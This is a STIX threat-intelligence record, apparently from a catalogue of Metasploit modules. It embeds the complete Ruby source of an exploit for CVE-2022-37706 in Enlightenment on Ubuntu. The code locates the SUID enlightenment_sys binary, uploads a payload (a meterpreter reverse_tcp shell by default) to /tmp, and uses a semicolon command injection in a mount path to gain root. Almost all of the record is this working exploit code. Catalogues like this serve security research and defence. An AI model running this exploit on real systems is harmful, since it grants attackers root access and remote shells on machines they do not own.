{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f26b10cc-26e3-4391-8e72-a10e37d6df76",
    "created": "2024-08-14T16:58:50.537408Z",
    "modified": "2024-08-14T16:58:50.537419Z",
    "name": "Ubuntu Enlightenment Mount Priv Esc",
    "description": " This module exploits a command injection within Enlightenment's enlightenment_sys binary. This is done by calling the mount command and feeding it paths which meet all of the system requirements, but execute a specific path as well due to a semi-colon being used. This module was tested on Ubuntu 22.04.1 X64 Desktop with enlightenment 0.25.3-1 (current at module write time)  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/ubuntu_enlightenment_mount_priv_esc.rb",
            "external_id": "ubuntu_enlightenment_mount_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/maherazz2/status/1569665311707734023"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-37706"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Ubuntu Enlightenment Mount Priv Esc',\n        'Description' => %q{\n          This module exploits a command injection within Enlightenment's\n          enlightenment_sys binary. This is done by calling the mount\n          command and feeding it paths which meet all of the system\n          requirements, but execute a specific path as well due to a\n          semi-colon being used.\n          This module was tested on Ubuntu 22.04.1 X64 Desktop with\n          enlightenment 0.25.3-1 (current at module write time)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Maher Azzouzi' # discovery, poc\n        ],\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' => [\n          [ 'URL', 'https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit' ],\n          [ 'URL', 'https://twitter.com/maherazz2/status/1569665311707734023' ],\n          [ 'CVE', '2022-37706' ]\n        ],\n        'DisclosureDate' => '2022-09-13',\n        'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n          'PrependFork' => true, # so we can exploit multiple times\n          'WfsDelay' => 10\n        },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def find_enlightenment_sys\n    enlightenment_sys = '/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys'\n    if file_exist?(enlightenment_sys)\n      vprint_good(\"Found binary: #{enlightenment_sys}\")\n      if setuid?(enlightenment_sys)\n        vprint_good(\"It's set for SUID\")\n        # at this time there doesn't seem to be any other way to check if it'll be exploitable\n        # like a version number as a patch hasn't been released yet\n        return enlightenment_sys\n      else\n        return nil\n      end\n    else\n      vprint_status('Manually searching for exploitable binary')\n      # https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh#L7\n      binary = cmd_exec('find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1')\n\n      if binary.blank?\n        vprint_bad('Unable to locate enlightenment_sys')\n        return nil\n      end\n      vprint_good(\"Found SUID binary: #{enlightenment_sys}\")\n      return binary\n    end\n  end\n\n  def check\n    enlightenment_sys = find_enlightenment_sys\n    return CheckCode::Safe('An exploitable enlightenment_sys was not found on the system') if enlightenment_sys.nil?\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    # Make sure we can write our exploit and payload to the local system\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    print_status('Finding enlightenment_sys')\n    enlightenment_sys = find_enlightenment_sys\n    if enlightenment_sys.nil?\n      fail_with Failure::NotFound, \"#{base_dir} is not writable\"\n    end\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n    dev_path = \"/dev/../tmp/;#{payload_path}\"\n    register_files_for_cleanup(payload_path)\n\n    print_status('Creating folders for exploit')\n    cmd_exec('rm -rf /tmp/net; mkdir -p /tmp/net')\n    cmd_exec(\"mkdir -p \\\"#{dev_path}\\\"\")\n    # Launch exploit with a timeout.  We also have a vprint_status so if the user wants all the\n    # output from the exploit being run, they can optionally see it\n    enlightenment_sys = find_enlightenment_sys\n    print_status 'Launching exploit...'\n    cmd_exec(\"#{enlightenment_sys} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \\\"#{dev_path}\\\" /tmp///net\", nil, datastore['WfsDelay'])\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-09-13",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}